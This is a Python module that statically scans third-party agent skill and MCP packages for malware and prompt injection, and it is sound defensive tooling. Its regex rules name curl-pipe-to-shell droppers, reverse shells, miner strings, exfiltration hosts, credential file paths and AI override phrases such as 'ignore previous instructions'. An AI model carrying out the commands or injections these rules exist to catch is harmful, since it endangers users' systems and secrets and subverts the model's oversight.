"""Deterministic static vetter for third-party skill/agent/MCP packages.

Scans every file of a candidate package (typically a quarantine directory
populated by ``acquire.fetch``) for malware and prompt-injection patterns.
The scanner is a **pure function of file bytes**: no network, no wall-clock,
no execution of scanned content — the same package always yields the same
report, which is what makes the output safe to paste into an audit trail.

Verdict model:

* ``PASS`` — no findings.
* ``WARN`` — suspicious but plausibly legitimate constructs (dynamic exec,
  credential-path references, persistence hooks, obfuscation). Installable
  only with an explicit ``--accept-warnings``.
* ``FAIL`` — patterns with no legitimate place in a distributed skill
  (shell-pipe installers, reverse shells, archive path escapes, crypto
  miners, exfiltration collectors, prompt injection). Install is refused.

Every finding carries ``file``, ``line``, ``rule`` and a capped ``excerpt``;
findings are sorted ``(file, line, rule)`` for deterministic output.

Fail-closed: any internal scanner error produces a ``scanner-error`` FAIL
finding rather than a silent pass. ``clamscan`` integration is OPT-IN
(``use_clamav=True``): its verdicts depend on the host's signature database,
which would break the determinism guarantee above. When enabled, a clamscan
*failure* is a scanner error (fail-closed, again); absence of the binary is
fine.
"""

from __future__ import annotations

import math
import os
import re
import shutil
import subprocess
import tarfile
import zipfile
from dataclasses import asdict, dataclass
from pathlib import Path
from typing import Any

# Directories that never carry distributable skill content (mirrors
# discovery.SKIP_DIRS semantics — kept local so this module stays
# dependency-free and deterministic).
_SKIP_DIRS = {".git", "node_modules", "dist", "build", "target", "__pycache__"}

# Files larger than this are scanned only partially; a WARN finding records
# the truncation so the verdict never silently claims full coverage.
_MAX_FILE_BYTES = 8 * 1024 * 1024

# Extensions whose payloads are legitimately binary: NUL bytes there carry no
# signal and the line rules are skipped. Any OTHER file containing NUL bytes
# is scanned with the NULs stripped plus a WARN finding — previously ANY NUL
# in the first 8 KiB skipped all line rules, so a SKILL.md with an early NUL
# and a `curl | sh` later installed clean (audit finding, 2026-08).
_BINARY_SUFFIXES = {
    ".7z",
    ".a",
    ".bin",
    ".bmp",
    ".bz2",
    ".class",
    ".dll",
    ".dylib",
    ".eot",
    ".exe",
    ".gif",
    ".gz",
    ".ico",
    ".jar",
    ".jpeg",
    ".jpg",
    ".mov",
    ".mp3",
    ".mp4",
    ".npy",
    ".npz",
    ".o",
    ".onnx",
    ".otf",
    ".pdf",
    ".png",
    ".pyc",
    ".rar",
    ".safetensors",
    ".so",
    ".tar",
    ".tgz",
    ".ttf",
    ".wav",
    ".webp",
    ".woff",
    ".woff2",
    ".xz",
    ".zip",
}

# Binary payloads that can carry CODE but are opaque to both the line rules
# and the stdlib archive readers (executables, objects, bytecode, and the
# archive formats we cannot parse). Silently skipping them used to report
# PASS with zero findings; they now leave a visible `unscanned-binary` WARN
# (audit finding, 2026-08). Media/font/document binaries (.png, .pdf, …)
# stay silent — they are ordinary skill-package content.
_OPAQUE_BINARY_SUFFIXES = {
    ".7z",
    ".a",
    ".class",
    ".dll",
    ".dylib",
    ".exe",
    ".jar",
    ".o",
    ".pyc",
    ".rar",
    ".so",
}

_EXCERPT_CAP = 200


@dataclass(frozen=True)
class Finding:
    """One scanner hit. ``severity`` is ``WARN`` or ``FAIL``."""

    rule: str
    severity: str
    path: str  # package-relative path
    line: int  # 1-based; 0 for whole-file/archive-level findings
    excerpt: str


@dataclass(frozen=True)
class ScanReport:
    verdict: str  # PASS | WARN | FAIL
    findings: tuple[Finding, ...]
    files_scanned: int
    files_truncated: int
    scanner: str
    clamav: str  # "not-run" | "clean" | "infected" | "error"

    def as_dict(self) -> dict:
        return {
            "verdict": self.verdict,
            "scanner": self.scanner,
            "files_scanned": self.files_scanned,
            "files_truncated": self.files_truncated,
            "clamav": self.clamav,
            "findings": [asdict(f) for f in self.findings],
        }


# ---------------------------------------------------------------------------
# Rules
# ---------------------------------------------------------------------------
#
# Each rule is (rule_id, severity, compiled regex). Patterns are matched per
# line against UTF-8 (errors=replace) text. Keep them specific: a WARN that
# fires on every legitimate skill trains operators to pass
# --accept-warnings blindly, which defeats the gate.

FAIL = "FAIL"
WARN = "WARN"

_LINE_RULES: tuple[tuple[str, str, re.Pattern[str]], ...] = (
    # --- shell-pipe installers (FAIL) --------------------------------------
    (
        "shell-pipe-installer",
        FAIL,
        re.compile(
            # curl/wget piped into a shell OR an interpreter. The pipe target
            # may carry sudo (with flags, e.g. `sudo -E bash`), an absolute
            # path prefix (/bin/sh), or be a non-shell interpreter (python3,
            # ruby, perl, node) — all execute the downloaded payload.
            r"\b(?:curl|wget)\b[^|\n]*\|\s*"
            r"(?:sudo\s+(?:-[A-Za-z]+\s+)*)?"
            r"(?:/[A-Za-z0-9_.-]+/)*"
            r"(?:(?:ba|z|fi|da|a)?sh|python[0-9.]*|ruby|perl|node)\b"
            r"|\b(?:iwr|irm|Invoke-WebRequest|Invoke-RestMethod)\b[^|\n]*"
            r"\|\s*(?:iex|Invoke-Expression)\b"
            # eval $(curl …) — command-substitution dropper.
            r"|\beval\s+[\"']?\$\(\s*[\"']?(?:curl|wget)\b"
            # bash <(curl …) — process-substitution dropper.
            r"|\b(?:ba|z|fi|da|a)?sh\s+<\(\s*(?:curl|wget)\b",
            re.IGNORECASE,
        ),
    ),
    # --- reverse / bind shells (FAIL) --------------------------------------
    (
        "reverse-shell",
        FAIL,
        re.compile(
            r"/dev/tcp/"
            r"|\bnc(?:at)?\b[^\n]*\s-e\s"
            r"|\bsocat\b[^\n]*\bexec\b"
            r"|\bdup2\s*\([^\n]*\b(?:socket|sock)\b|\bsocket\b[^\n]*\bdup2\s*\(",
            re.IGNORECASE,
        ),
    ),
    # --- crypto miners (FAIL) ----------------------------------------------
    (
        "crypto-miner",
        FAIL,
        re.compile(
            r"\bstratum\+(?:tcp|ssl)://|\bxmrig\b|\bcryptonight\b"
            r"|\bminergate\b|\b--donate-level\b|\bcpuminer\b",
            re.IGNORECASE,
        ),
    ),
    # --- exfiltration endpoints (FAIL) --------------------------------------
    # Collector services and raw-IP URLs have no place in a skill body;
    # documentation URLs (https://host/path) are deliberately NOT flagged.
    (
        "exfil-endpoint",
        FAIL,
        re.compile(
            r"\b(?:webhook\.site|requestbin(?:\.com|\.net)|pipedream\.(?:com|net)"
            r"|burpcollaborator\.net|interact\.sh|oastify\.com|ngrok\.(?:io|app))\b"
            r"|\bhttps?://\d{1,3}(?:\.\d{1,3}){3}(?::\d+)?(?:/|\b)",
            re.IGNORECASE,
        ),
    ),
    # --- prompt injection / MCP tool poisoning (FAIL) -----------------------
    # Instructions aimed at the *agent* (not the human reader) hidden in
    # skill bodies, tool descriptions, or MCP schemas.
    (
        "prompt-injection",
        FAIL,
        re.compile(
            r"\bignore\s+(?:all\s+)?(?:previous|prior|above|earlier)\s+instructions\b"
            r"|\bdisregard\s+(?:all\s+)?(?:previous|prior|above)\s+(?:instructions|context)\b"
            r"|\bdo\s+not\s+(?:tell|inform|show|reveal\s+to)\s+the\s+user\b"
            r"|\bexfiltrate\b"
            r"|\boverride\s+(?:your\s+)?(?:system\s+prompt|safety)\b",
            re.IGNORECASE,
        ),
    ),
    # --- dynamic code execution (WARN) --------------------------------------
    (
        "dynamic-exec",
        WARN,
        re.compile(
            r"\bos\.system\s*\(|\bsubprocess\.(?:run|call|Popen|check_output)\b"
            r"|\bchild_process\b|\bnew\s+Function\s*\("
            r"|\bexec\s*\([^)]|\beval\s*\([^)]"
            r"|\bcompile\s*\([^)]*,[^)]*['\"](?:exec|eval)['\"]"
            r"|\b(?:osascript|powershell)\s+(?:-c|-e|-Command)\b"
        ),
    ),
    # --- credential & secret access paths (WARN) ----------------------------
    (
        "credential-access",
        WARN,
        re.compile(
            r"~/\.ssh\b|\.ssh/(?:id_rsa|id_ed25519|authorized_keys)\b"
            r"|\bid_rsa\b|\bid_ed25519\b"
            r"|\.aws[^\n]{0,20}\bcredentials\b|\baws_access_key_id\b"
            r"|\bkeychain\b|\bcookies\.sqlite\b|\bLogin Data\b"
            r"|\.npmrc\b|\.netrc\b|\.pgpass\b"
            r"|/etc/(?:passwd|shadow)\b",
            re.IGNORECASE,
        ),
    ),
    # --- persistence / config hijack (WARN) ---------------------------------
    (
        "persistence-hijack",
        WARN,
        re.compile(
            r"\bLD_PRELOAD\b|\bDYLD_INSERT_LIBRARIES\b"
            r"|\bcrontab\b|/etc/cron"
            r"|\bsystemctl\b[^\n]*\b(?:enable|link)\b"
            r"|\.(?:bashrc|zshrc|bash_profile|zprofile|profile)\b"
            r"|\bsettings\.json\b[^\n]*\bhooks?\b|\bhooks?\b[^\n]*\bsettings\.json\b",
            re.IGNORECASE,
        ),
    ),
    # --- dotenv harvesting (WARN) -------------------------------------------
    # A bare ".env" mention in prose is common; reading/exfiltrating one is
    # not. Require an access verb on the same line.
    (
        "dotenv-access",
        WARN,
        re.compile(
            r"\b(?:cat|read|open|load|source|curl|wget|send|upload|post)\b[^\n]*\.env\b",
            re.IGNORECASE,
        ),
    ),
)

_BASE64_BLOB = re.compile(r"[A-Za-z0-9+/]{160,}={0,2}(?![A-Za-z0-9+/=])")
_HEX_BLOB = re.compile(r"\b[0-9a-fA-F]{256,}\b")
_CONTINUATION_FOLD = re.compile(r"\\\r?\n")
_WHITESPACE_RUN = re.compile(r"\s+")
# Rules whose patterns are SELF-BOUNDING (a fixed handful of adjacent tokens,
# no [^|]*-style spans) get a whole-file whitespace-normalized pass: splitting
# "ignore all\nprevious\ninstructions" across 3+ newlines evades both the
# per-line and 2-line views (codex audit, 2026-08 r4). Span-bearing rules
# (shell-pipe's [^|\n]*) are excluded — in a normalized whole-file view their
# span could join distant unrelated text into a false positive.
_MULTILINE_NORMALIZED_RULES = {"prompt-injection"}
_ENTROPY_MIN_LEN = 48
_ENTROPY_THRESHOLD = 4.9  # bits/char; hex (<=4.0) and most hashes stay below
_TOKEN_RUN = re.compile(r"[A-Za-z0-9+/_\-]{%d,}" % _ENTROPY_MIN_LEN)


def _shannon_entropy(s: str) -> float:
    counts: dict[str, int] = {}
    for ch in s:
        counts[ch] = counts.get(ch, 0) + 1
    n = len(s)
    return -sum((c / n) * math.log2(c / n) for c in counts.values())


def _excerpt(line: str) -> str:
    out = line.strip()
    if len(out) > _EXCERPT_CAP:
        out = out[: _EXCERPT_CAP - 1] + "…"
    return out


# ---------------------------------------------------------------------------
# Archive path-escape checks
# ---------------------------------------------------------------------------


def _is_escape(name: str) -> bool:
    """True for archive member names that escape the extraction root."""
    if name.startswith(("/", "\\")) or re.match(r"^[A-Za-z]:[\\/]", name):
        return True
    parts = re.split(r"[/\\]", name)
    return ".." in parts


# Bounds for content-scanning archive members: per-member and cumulative.
# Members past the budget are not silently skipped — one WARN per archive
# records that they are opaque to the line rules.
_ARCHIVE_MEMBER_CAP = 1 * 1024 * 1024
_ARCHIVE_TOTAL_CAP = 8 * 1024 * 1024
_ARCHIVE_SUFFIXES = (".zip", ".tar", ".tgz", ".tar.gz", ".gz", ".bz2", ".xz")

# Member-count cap, enforced DURING enumeration: a bomb of millions of tiny
# headers otherwise materialises the whole member list (and exhausts RAM)
# before any byte cap trips. Past the cap the archive cannot be vetted, so
# the finding is a FAIL. (zip's central directory is parsed whole by the
# stdlib at open; the cap still trips before any member content is read.
# tar is genuinely streamed below.)
_ARCHIVE_MEMBER_LIMIT = 4096


def _has_archive_magic(data: bytes) -> bool:
    """Magic-byte archive detection on the (possibly truncated) head bytes.

    Suffix-based dispatch let a zip renamed `.jar` bypass every archive
    escape check (audit finding, 2026-08 r3); archive scanning is dispatched
    on content, not on the name.
    """
    return (
        data.startswith(b"PK\x03\x04")  # zip (incl. jar)
        or data.startswith(b"PK\x05\x06")  # empty zip
        or data.startswith(b"\x1f\x8b")  # gzip (incl. .tar.gz)
        or data.startswith(b"BZh")  # bzip2
        or data.startswith(b"\xfd7zXZ\x00")  # xz
        or data[257:262] == b"ustar"  # tar
    )


def _scan_archive_members(
    read_member: Any,
    members: list[tuple[str, int]],
    rel: str,
    findings: list[Finding],
) -> None:
    """Content-scan text members of an archive (bounded, fail-closed).

    Escape checks alone miss the real payload: a zip whose paths are clean
    can still carry a `curl | sh` script. Text members are run through the
    same line rules as top-level files, addressed as ``<archive>!<member>``.
    Binary members are skipped; nested archives are not recursed into (a
    WARN marks each as opaque).
    """
    total = 0
    budget_warned = False
    for name, size in sorted(members):
        if size > _ARCHIVE_MEMBER_CAP or total + size > _ARCHIVE_TOTAL_CAP:
            if not budget_warned:
                findings.append(
                    Finding(
                        "archive-scan-budget",
                        WARN,
                        rel,
                        0,
                        "archive members exceed the content-scan budget; "
                        "oversized members are opaque to the line rules",
                    )
                )
                budget_warned = True
            continue
        if name.lower().endswith(_ARCHIVE_SUFFIXES):
            findings.append(Finding("nested-archive-opaque", WARN, rel, 0, _excerpt(name)))
            continue
        try:
            data = read_member(name)
        except Exception as e:  # noqa: BLE001 — fail closed
            findings.append(Finding("scanner-error", FAIL, rel, 0, _excerpt(f"{name}: {e}")))
            continue
        total += len(data)
        # NUL probe covers the WHOLE member buffer, not just the first
        # 8 KiB: bash strips NUL bytes, so a mid-buffer `cu\0rl … | bash`
        # executes fine while a prefix-only probe scans it clean (codex
        # audit, 2026-08 r4).
        if b"\x00" in data:
            msuffix = Path(name).suffix.lower()
            if msuffix in _OPAQUE_BINARY_SUFFIXES:
                findings.append(
                    Finding(
                        "unscanned-binary",
                        WARN,
                        f"{rel}!{name}",
                        0,
                        "opaque executable/archive binary member; content not scanned",
                    )
                )
                continue
            if msuffix in _BINARY_SUFFIXES:
                continue  # known-binary payload: line rules do not apply
            # Same fail-closed rule as top-level files: a text-shaped member
            # hiding NUL bytes is stripped and scanned anyway — an early NUL
            # used to skip ALL line rules for the member (audit, 2026-08 r3).
            findings.append(
                Finding(
                    "binary-content-in-text-file",
                    WARN,
                    f"{rel}!{name}",
                    0,
                    "NUL byte in a non-binary archive member; scanned with NULs stripped",
                )
            )
            data = data.replace(b"\x00", b"")
        findings.extend(_scan_text(Path(name), f"{rel}!{name}", data))


def _scan_archive(path: Path, rel: str) -> list[Finding]:
    """Path-escape, symlink-escape, and member-content checks for zip/tar."""
    findings: list[Finding] = []
    try:
        if zipfile.is_zipfile(path):
            with zipfile.ZipFile(path) as zf:
                infos = zf.infolist()
                if len(infos) > _ARCHIVE_MEMBER_LIMIT:
                    findings.append(
                        Finding(
                            "archive-member-cap",
                            FAIL,
                            rel,
                            0,
                            f"archive has {len(infos)} members "
                            f"(> {_ARCHIVE_MEMBER_LIMIT}); too large to vet",
                        )
                    )
                    return findings
                members: list[tuple[str, int]] = []
                for info in infos:
                    if _is_escape(info.filename):
                        findings.append(
                            Finding("path-escape", FAIL, rel, 0, _excerpt(info.filename))
                        )
                    if not info.is_dir():
                        members.append((info.filename, info.file_size))
                _scan_archive_members(zf.read, members, rel, findings)
        elif tarfile.is_tarfile(path):
            with tarfile.open(path) as tf:
                members = []
                count = 0
                capped = False
                # Iterate the tar stream — getmembers() would materialise the
                # whole list before the count cap could trip.
                for member in tf:
                    count += 1
                    if count > _ARCHIVE_MEMBER_LIMIT:
                        findings.append(
                            Finding(
                                "archive-member-cap",
                                FAIL,
                                rel,
                                0,
                                f"archive has more than {_ARCHIVE_MEMBER_LIMIT} "
                                "members; too large to vet",
                            )
                        )
                        capped = True
                        break
                    if _is_escape(member.name):
                        findings.append(Finding("path-escape", FAIL, rel, 0, _excerpt(member.name)))
                    if member.issym() or member.islnk():
                        if _is_escape(member.linkname):
                            findings.append(
                                Finding(
                                    "symlink-escape",
                                    FAIL,
                                    rel,
                                    0,
                                    _excerpt(f"{member.name} -> {member.linkname}"),
                                )
                            )
                    elif member.isfile():
                        members.append((member.name, member.size))

                def _read_member(name: str, _tf: tarfile.TarFile = tf) -> bytes:
                    fh = _tf.extractfile(name)
                    if fh is None:
                        raise OSError(f"cannot extract {name}")
                    return fh.read(_ARCHIVE_MEMBER_CAP + 1)

                if not capped:
                    _scan_archive_members(_read_member, members, rel, findings)
    except (OSError, zipfile.BadZipFile, tarfile.TarError) as e:
        # A corrupt archive cannot be vetted -> fail closed.
        findings.append(Finding("scanner-error", FAIL, rel, 0, _excerpt(str(e))))
    return findings


# ---------------------------------------------------------------------------
# Per-file scan
# ---------------------------------------------------------------------------


def _scan_text(path: Path, rel: str, data: bytes) -> list[Finding]:
    findings: list[Finding] = []
    text = data.decode("utf-8", errors="replace")
    lines = text.splitlines()
    fired: set[tuple[str, int]] = set()

    def _apply_rules(line: str, lineno: int) -> None:
        for rule, severity, pat in _LINE_RULES:
            if (rule, lineno) in fired:
                continue
            if pat.search(line):
                findings.append(Finding(rule, severity, rel, lineno, _excerpt(line)))
                fired.add((rule, lineno))

    for lineno, line in enumerate(lines, 1):
        _apply_rules(line, lineno)
        if _BASE64_BLOB.search(line) or _HEX_BLOB.search(line):
            # One obfuscation finding per line is enough.
            findings.append(Finding("obfuscated-blob", WARN, rel, lineno, _excerpt(line)))
            continue
        # High-entropy token check only when no blob already fired here.
        for m in _TOKEN_RUN.finditer(line):
            if _shannon_entropy(m.group(0)) >= _ENTROPY_THRESHOLD:
                findings.append(Finding("high-entropy-string", WARN, rel, lineno, _excerpt(line)))
                break

    # Per-line rules alone are evaded by splitting a payload across lines.
    # Two complementary folded views close that without touching the
    # blob/entropy rules (which are inherently per-line):
    #
    # 1. Shell continuation fold: `curl https://evil/p \` <newline> `| bash`
    #    matches nothing per-line. Fold backslash-newlines and re-run; folded
    #    line N maps to the raw line where the continuation group starts.
    folded = _CONTINUATION_FOLD.sub(" ", text)
    if folded != text:
        for lineno, line in enumerate(folded.splitlines(), 1):
            _apply_rules(line, lineno)
    # 2. Sliding 2-line window: phrases split across a PLAIN newline
    #    ("ignore all previous\ninstructions", MCP poisoning broken over two
    #    description lines). Only report rules not already fired on either
    #    constituent line, so single-line matches are not double-counted.
    for i in range(len(lines) - 1):
        combined = lines[i] + " " + lines[i + 1]
        for rule, severity, pat in _LINE_RULES:
            if (rule, i + 1) in fired or (rule, i + 2) in fired:
                continue
            if pat.search(combined):
                findings.append(Finding(rule, severity, rel, i + 1, _excerpt(combined)))
                fired.add((rule, i + 1))
    # 3. Whole-file whitespace-normalized view for self-bounding rules: a
    #    phrase split across 3+ plain newlines ("ignore all\nprevious\n
    #    instructions", "do not\ntell\nthe\nuser") matches nothing in any
    #    2-line window. Reported once per rule at line 0, and only when the
    #    rule has not already fired on a real line.
    normalized = _WHITESPACE_RUN.sub(" ", text)
    if normalized != text:
        for rule, severity, pat in _LINE_RULES:
            if rule not in _MULTILINE_NORMALIZED_RULES:
                continue
            if any(r == rule for r, _ in fired):
                continue
            m = pat.search(normalized)
            if m:
                findings.append(Finding(rule, severity, rel, 0, _excerpt(m.group(0))))
                fired.add((rule, 0))
    return findings


def _check_symlink(p: Path, rel: str, root_resolved: Path, findings: list[Finding]) -> None:
    """Judge one symlink — file or directory — against the package boundary.

    The same rules apply to both: os.walk reports symlinked DIRECTORIES in
    ``dirnames`` (never in ``filenames``, and with ``followlinks=False`` it
    never descends them), so a file-only check missed them while install's
    copytree dereferenced them into the hub (audit finding, 2026-08 r3).
    """
    target = os.readlink(p)
    resolved = (p.parent / target).resolve()
    # Boundary comparison, not startswith: "/pkg-evil/x" starts
    # with "/pkg" as a string but is NOT inside it.
    if resolved != root_resolved and root_resolved not in resolved.parents:
        findings.append(
            Finding(
                "symlink-escape",
                FAIL,
                rel,
                0,
                _excerpt(f"{rel} -> {target}"),
            )
        )
        return
    if not resolved.exists():
        # A dangling link vets clean here but makes install's copytree raise
        # mid-copy, leaving a manifest-less partial hub dir that remove()
        # then refuses to delete. Fail at vet instead.
        findings.append(
            Finding(
                "dangling-symlink",
                FAIL,
                rel,
                0,
                _excerpt(f"{rel} -> {target} (target does not exist)"),
            )
        )
        return
    # Inside the package the symlink is only safe if its target's CONTENT is
    # scanned by the walk. A target inside a skipped dir (dist/, build/,
    # node_modules, …) is never walked, and install copies the link into the
    # hub — so `SKILL.md -> dist/payload.md` would vet clean and ship an
    # unscanned payload. Fail closed.
    try:
        rel_target = resolved.relative_to(root_resolved)
    except ValueError:
        rel_target = None
    if rel_target is None or set(rel_target.parts) & _SKIP_DIRS:
        findings.append(
            Finding(
                "symlink-to-skipped-dir",
                FAIL,
                rel,
                0,
                _excerpt(f"{rel} -> {target} (target never scanned)"),
            )
        )


def scan_path(root: str | Path, *, use_clamav: bool = False) -> ScanReport:
    """Scan every file under *root* and return a deterministic verdict.

    ``use_clamav`` is opt-in: clamscan verdicts depend on the host's PATH and
    signature database, so a clamav-influenced report is NOT the
    deterministic, reproducible artifact the default report is documented to
    be. Enable it explicitly when the extra engine is worth the variance.
    """
    root = Path(root)
    findings: list[Finding] = []
    files_scanned = 0
    files_truncated = 0

    if not root.is_dir():
        findings.append(Finding("scanner-error", FAIL, str(root), 0, "not a directory"))
        return _report(findings, files_scanned, files_truncated, "not-run")

    root_resolved = root.resolve()
    paths: list[Path] = []
    for dirpath, dirnames, filenames in os.walk(root):
        kept: list[str] = []
        for d in sorted(dirnames):
            if d in _SKIP_DIRS:
                continue
            full = Path(dirpath) / d
            if full.is_symlink():
                # A symlinked directory lands in dirnames, never in
                # filenames — judge it with the same rules as file links.
                _check_symlink(full, str(full.relative_to(root)), root_resolved, findings)
                continue
            kept.append(d)
        dirnames[:] = kept
        for fn in sorted(filenames):
            paths.append(Path(dirpath) / fn)
    paths.sort(key=lambda p: str(p.relative_to(root)))

    for p in paths:
        rel = str(p.relative_to(root))
        try:
            if p.is_symlink():
                _check_symlink(p, rel, root_resolved, findings)
                continue
            with p.open("rb") as fh:
                data = fh.read(_MAX_FILE_BYTES + 1)
            truncated = len(data) > _MAX_FILE_BYTES
            if truncated:
                data = data[:_MAX_FILE_BYTES]
                files_truncated += 1
                findings.append(
                    Finding(
                        "file-truncated",
                        WARN,
                        rel,
                        0,
                        f"file exceeds {_MAX_FILE_BYTES} bytes; scanned partially",
                    )
                )
            files_scanned += 1
            suffix = p.suffix.lower()
            # Archive dispatch is by MAGIC BYTES, not suffix: a zip renamed
            # `.jar` must still get the escape/member-content checks.
            is_archive = suffix in {
                ".zip",
                ".tar",
                ".tgz",
                ".gz",
                ".bz2",
                ".xz",
            } or _has_archive_magic(data)
            if is_archive:
                findings.extend(_scan_archive(p, rel))
            # The NUL probe covers the WHOLE scanned buffer, not just the
            # first 8 KiB: bash strips NUL bytes, so a mid-buffer
            # `cu\0rl … | bash` executes fine while a prefix-only probe
            # scans it clean (codex audit, 2026-08 r4).
            if b"\x00" in data:
                if is_archive:
                    continue  # the archive checks above are the coverage
                if suffix in _OPAQUE_BINARY_SUFFIXES:
                    findings.append(
                        Finding(
                            "unscanned-binary",
                            WARN,
                            rel,
                            0,
                            "opaque executable/archive binary; content not scanned",
                        )
                    )
                    continue
                if suffix in _BINARY_SUFFIXES:
                    continue  # known-binary payload: line rules do not apply
                # A text-shaped file hiding NUL bytes is itself suspicious:
                # strip the NULs and scan anyway (fail-closed against the
                # "early NUL hides curl|sh" bypass).
                findings.append(
                    Finding(
                        "binary-content-in-text-file",
                        WARN,
                        rel,
                        0,
                        "NUL byte in a non-binary file extension; scanned with NULs stripped",
                    )
                )
                data = data.replace(b"\x00", b"")
            findings.extend(_scan_text(p, rel, data))
        except Exception as e:  # noqa: BLE001 — fail closed, never crash
            findings.append(Finding("scanner-error", FAIL, rel, 0, _excerpt(str(e))))

    clamav = "not-run"
    if use_clamav:
        clamav, clam_findings = _run_clamscan(root)
        findings.extend(clam_findings)

    return _report(findings, files_scanned, files_truncated, clamav)


def _run_clamscan(root: Path) -> tuple[str, list[Finding]]:
    """Fold clamscan into the report when it is installed.

    Returns (status, findings). Absence of clamscan is never an error; a
    clamscan execution failure IS (fail-closed).
    """
    binary = shutil.which("clamscan")
    if binary is None:
        return "not-run", []
    try:
        proc = subprocess.run(  # noqa: S603 — fixed argv, no shell
            [binary, "--no-summary", "-r", str(root)],
            capture_output=True,
            text=True,
            timeout=300,
            check=False,
        )
    except (OSError, subprocess.TimeoutExpired) as e:
        return "error", [Finding("scanner-error", FAIL, ".", 0, _excerpt(f"clamscan: {e}"))]
    findings: list[Finding] = []
    if proc.returncode == 1:
        for line in sorted(proc.stdout.splitlines()):
            s = line.strip()
            if s.endswith("FOUND"):
                # clamscan output is "<path>: <signature> FOUND" — keep only
                # the signature so findings never embed host paths.
                sig = s.rsplit(":", 1)[-1].removesuffix("FOUND").strip() if ":" in s else s
                findings.append(Finding("clamav-signature", FAIL, ".", 0, _excerpt(sig)))
        return "infected", findings
    if proc.returncode != 0:
        return "error", [
            Finding(
                "scanner-error",
                FAIL,
                ".",
                0,
                _excerpt(f"clamscan exited {proc.returncode}: {proc.stderr.strip()}"),
            )
        ]
    return "clean", []


def _report(
    findings: list[Finding], files_scanned: int, files_truncated: int, clamav: str
) -> ScanReport:
    ordered = tuple(sorted(findings, key=lambda f: (f.path, f.line, f.rule)))
    if any(f.severity == FAIL for f in ordered):
        verdict = "FAIL"
    elif ordered:
        verdict = "WARN"
    else:
        verdict = "PASS"
    return ScanReport(
        verdict=verdict,
        findings=ordered,
        files_scanned=files_scanned,
        files_truncated=files_truncated,
        scanner="mind-nerve-security-scan/1",
        clamav=clamav,
    )
